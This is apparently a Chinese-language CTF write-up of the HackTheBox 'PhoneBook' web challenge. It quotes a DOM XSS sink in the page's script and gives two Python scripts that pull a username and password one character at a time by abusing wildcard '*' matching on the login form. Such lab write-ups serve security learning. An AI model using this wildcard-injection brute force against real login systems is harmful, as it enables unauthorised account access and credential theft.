---
title: HackTheBox PhoneBook WriteUP
date: 2023-08-22 09:15:09
tags: 
- HackTheBox
- Web
---

## 题目

![Who is lucky enough to be included in the phonebook?](image-1.png)

## 思路

题目给出的网页是这样

![index](image-2.png)

看到HTML中有这样一段代码，还以为这题是个DOM XSS(事实上也确实有XSS)

``` HTML
<script>
  const queryString = window.location.search;
if (queryString) {
  const urlParams = new URLSearchParams(queryString);
  const message = urlParams.get('message');
  if (message) {
    document.getElementById("message").innerHTML = message;
    document.getElementById("message").style.visibility = "visible";
    }
  }
</script>
```

但是XSS是需要人触发的，题目中并没有给出任何BOT的信息。

所以最终的解法要落在登录功能上。

## 解题

登录功能可以通过通配符`*`进入，登录成功之后是一个只有搜索框的页面（这里忘记截图了）。搜索功能可以找到若干账户的信息。

![搜索](image-3.png)

题目的提示是：`Who is lucky enough to be included in the phonebook?`，所以我们应该想办法获取能登录的账号密码。

登录功能可以识别通配符，所以直接写脚本遍历就好了。

> userbrute.py

``` python
import requests

url = "http://157.245.43.189:30403/login"
value = ''
flag = True

while(flag):
    flag = False
    for i in range(33,126,1):
        if(chr(i)=='*'):
            continue
        uname = value + chr(i) + '*'
        data = {"username": uname, "password": "*"}
        resp = requests.post(url, data=data, allow_redirects=False)
        print(uname+'\t'+str(resp.status_code))
        if(resp.status_code != 302):
            continue
        if(resp.headers['Location'] == '/'):
            value = value+chr(i)
            print(value)
            flag = True
            break
```

> passbrute.py

``` python
import requests

url = "http://157.245.43.189:30403/login"
value = ''
flag = True

while(flag):
    flag = False
    for i in range(33,126,1):
        if(chr(i)=='*'):
            continue
        password = value + chr(i) + '*'
        data = {"username": "REESE", "password": password}
        resp = requests.post(url, data=data, allow_redirects=False)
        # print(password+'\t'+str(resp.status_code))
        if(resp.status_code != 302):
            continue
        if(resp.headers['Location'] == '/'):
            value = value+chr(i)
            print(value)
            flag = True
            break
```

取得flag：

![flag](image-4.png)

## 后记

~~真正的解题思路是看了别人的writeup才明白的，通配符这是真没想到……~~